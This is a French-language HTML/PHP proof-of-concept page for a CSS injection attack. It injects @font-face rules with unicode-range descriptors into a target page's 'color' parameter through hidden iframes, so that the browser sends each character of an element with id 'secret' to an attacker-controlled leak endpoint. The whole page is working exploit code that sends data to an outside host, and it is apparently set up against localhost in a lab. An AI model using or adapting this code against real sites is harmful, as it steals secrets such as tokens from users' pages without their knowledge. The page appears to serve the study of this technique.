<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Les injections CSS - Règle @font-face et descripteur unicode</title>
        <style>
            #current {
                font-size: 32px;
                color: red;
            }

            #time_to_next {
                font-size: 24px;
                color: black;
            }

            #frames {
                visibility: hidden;
            }
        </style>
    </head>
    <body>
        <h1>Injection CSS - récupération de la valeur d'un élément HTML via @font-face et descripteur unicode</h1>

        <?php
            if (isset($_GET['action']) && $_GET['action'] === 'start') {
                $filePath = 'leak.html';
                file_put_contents($filePath, '');
            }
        ?>

        <h2>PoC #2 - iFrames invisibles</h2>
        <form method="GET" action="">
            <button type="submit" name="action" value="start">Démarrer l'attaque</button>
        </form>

        <div id="current"></div>
        <div id="time_to_next"></div>
        <div id="frames"></div>

        <script>
            /* ==== CONFIG ==== */
            const RHOST = "http://127.0.0.1"
            const RURL = "/index.php?color=";  
            const LHOST = "http://127.0.0.1:81"
            const LURL_KNOWNCHARS = "/knownChars.php";
            const LURL_LEAKCHAR = "/leak.php?char=";
            const HTML_ID_NAME = "secret";
            const PREFIX = "red;}";
            /********************/

            const CHARS_1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
            const CHARS_2 = "abcdefghijklmnopqrstuvwxyz".split("");
            const CHARS_3 = "0123456789".split("");
            const CHARS_4 = "_-".split("");
            const CHARS = CHARS_1.concat(CHARS_2, CHARS_3, CHARS_4);

            known = "";
            target_time = new Date();
            timer = 0;

            function test_char() {
                // Remove all the frames
                document.getElementById("frames").innerHTML = "";
                
                for(i = 0 ; i < CHARS.length ; i++) {
                    css = build_css(CHARS[i]);

                    // Create an iframe to try the attack
                    frame = document.createElement("iframe");
                    frame.src = RHOST + RURL + PREFIX + css;
                    frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
                    document.getElementById("frames").appendChild(frame);

                    clearInterval(timer);
                    target_time = new Date();
                    target_time.setSeconds(target_time.getSeconds() + 1);
                    timer = setInterval(function() {
                        var current_time = new Date();
                        diff = target_time - current_time;
                        document.getElementById("time_to_next").innerHTML = "Time to next reload: " + diff / 1000;
                    }, 50);
                }

                // Waiting for 3 seconds to ensure that all responses have been received.
                setTimeout(function() {
                    var oReq = new XMLHttpRequest();
                    oReq.addEventListener("load", function known_listener() {
                        document.getElementById("current").innerHTML = "Current retrieved data: " + this.responseText;
                        known = this.responseText;
                        setTimeout(function() {
                            alert("Retrieved data is: " + known);
                        }, 500);
                    });
                    oReq.open("GET", LHOST + LURL_KNOWNCHARS);
                    oReq.send();
                }, 3000);
            }

            function build_css(char) {
                css_payload = "";
                css_payload = encodeURIComponent("@font-face{font-family:attack;src:url(" + LHOST + LURL_LEAKCHAR + char + ");unicode-range:"+ getUnicodeFromChar(char) +"}#" + HTML_ID_NAME + "{font-family:attack;}");
                
                return css_payload;
            }
            
            function getUnicodeFromChar(char) {
                if (char.length === 1) {
                    return 'U+' + char.charCodeAt(0).toString(16).padStart(4, '0').toUpperCase();
                } else {
                    return "Veuillez entrer un seul caractère.";
                }
            }

            document.addEventListener('DOMContentLoaded', function () {
                const params = new URLSearchParams(window.location.search);
                const action = params.get('action');

                if (action === 'start') {
                    setTimeout(function() {
                        test_char();
                    }, 1500);
                }
            });
        </script>
    </body>
</html>